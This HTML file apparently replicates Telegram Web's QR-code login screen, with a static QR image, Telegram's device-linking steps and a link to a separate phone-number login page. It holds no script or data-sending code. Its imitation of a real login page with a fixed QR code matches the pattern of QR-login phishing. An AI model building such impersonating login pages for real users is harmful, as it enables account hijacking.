<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web - QR Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="qr-container">
            <img src="tg_qr code.png" alt="Telegram QR Code" class="qr-code">
            <div class="telegram-logo">
                <img src="Logo-Animation-Lottie-Maryna-L-unscreen.gif" alt="Telegram Logo">
            </div>
        </div>
        
        <h1>Log in to Telegram by QR Code</h1>
        
        <div class="steps">
            <div class="step">
                <span class="step-number">1</span>
                <p>Open Telegram on your phone</p>
            </div>
            
            <div class="step">
                <span class="step-number">2</span>
                <p>Go to <span class="bold">Settings > Devices > Link Desktop Device</span></p>
            </div>
            
            <div class="step">
                <span class="step-number">3</span>
                <p>Point your phone at this screen to confirm login</p>
            </div>
        </div>

        <div class="buttons">
            <a href="index2.html" class="phone-login">LOG IN BY PHONE NUMBER</a>
        </div>
    </div>
</body>
</html>
